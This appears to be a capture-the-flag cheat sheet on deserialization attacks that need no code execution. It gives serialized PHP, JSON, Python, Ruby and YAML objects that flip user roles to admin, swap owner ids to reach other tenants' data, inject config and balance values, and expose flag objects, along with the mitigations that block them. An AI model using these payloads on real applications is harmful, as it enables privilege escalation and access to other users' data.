# Object Primitives — the non-RCE payloads that still solve

## The point — a gadget isn't always `system()`

Half of deserialization wins are *property injections* — no code, just a
privileged object the app trusts. The class's primitive set is wider than
RCE.

## The prop-injection family — the quiet wins

### Role/permission flip

```php
O:8:"User":3:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";s:8:"is_admin";b:1;}
```

```java
// a serialized User/Principal with role=admin / a ClaimsPrincipal
```

```python
class User:
    role='admin'; is_admin=True; perms=['*']
```

```json
{"$type":"System.Security.Principal.GenericPrincipal",
 "Identity":{"$type":"...","Name":"admin"},"Roles":["Admin"]}
```

No `exec` — the object just *is* an admin. The app's `if user.role ==
'admin'` gate opens.

### IDOR via object-id

```php
O:5:"Order":2:{s:2:"id";i:1;s:5:"owner";s:4:"them";}
```

The object's `id`/`owner`/`user_id`/`account_id` prop points at another
tenant's row — the deserializer hands you a *trusted* object with the
wrong ownership.

### Config/flag injection

```php
O:6:"Config":{debug:true, flag_path:"/flag", secret:"..."}
```

An object the app treats as its own config — the `debug`/`api_key`/path
prop reaches behavior the app didn't expect you to set.

### State/balance injection

```php
O:7:"Account":{balance:999999, verified:true, paid:true}
```

A serialized cart/account/score — business-logic values the app trusted
because "the server wrote them".

## The typed-tag equivalent — no magic method needed

A `!ruby/object:User {admin: true}` or `!!python/object:User {is_admin: 1}`
or `{"$type":"User","Role":"admin"}` — the typed-tag itself instantiates a
privileged object; no chain is needed because the class's mere construction
IS the win.

## The "the object is the flag" shape

```php
O:4:"Flag":1:{s:5:"value";s:10:"flag{...}";}
```

The *deserialized object* carries the flag — read the stream first
(`php_ser_parse`/`pickle_dis`/`java_ser`) — the challenge's real blob may
already contain the flag; your job is just to DESERIALIZE it into the
response (a `var_dump`/`echo`/`toString` renders it).

## The `R:`/`r:` graph — two objects with a link

A `User` + a `Role` object where `user.role` is a back-ref to the Role —
`R:`/`r:` — the prop isn't a string, it's a LINK to another object. The
graph matters when the check is `user.role.name == 'admin'` — the role is
a second O: block.

## The "make the app trust your object" pattern

```php
// app does:
$u = unserialize($_COOKIE['u']);
if ($u->role === 'admin' && $u->verified) { show_flag(); }
```

The object's props are the gate — a privileged `User` object is the whole
exploit. NO chain, NO magic method — just the right prop values.

## The "signed prop" exception — when a prop is re-checked

```php
if ($u->role === 'admin' && $u->sig === hash($u->role.SECRET)) {...}
```

The prop carries its own MAC — the prop-injection is blocked unless you
can compute the sig → back to the key problem (`signature-bypass.md`).

## When prop-injection beats RCE

- the app checks `is_admin`/`role`/`verified`/`perms` → prop-injection
- the flag is a field the object carries → deserialize+render it
- a signature validates the WHOLE blob but each prop is free → flip props
  inside a real signed blob (if the sig covers the whole blob — it does —
  this needs the key; but some apps sign a DIFFERENT field)
- RCE is filtered but the object's props aren't code → prop-injection

## Falsifiers

- the app re-validates props server-side (`if ($u->check())`)
- the object's role/flag is re-fetched from the DB by id, not trusted from
  the object
- the deserializer instantiates into a class the app doesn't trust
- `allowed_classes`/Binder blocks your class entirely

## Output to record

- The prop(s) injected + their values
- The gate they opened (role=admin → /admin/flag)
- The verbatim response proving the privileged state reached the flag
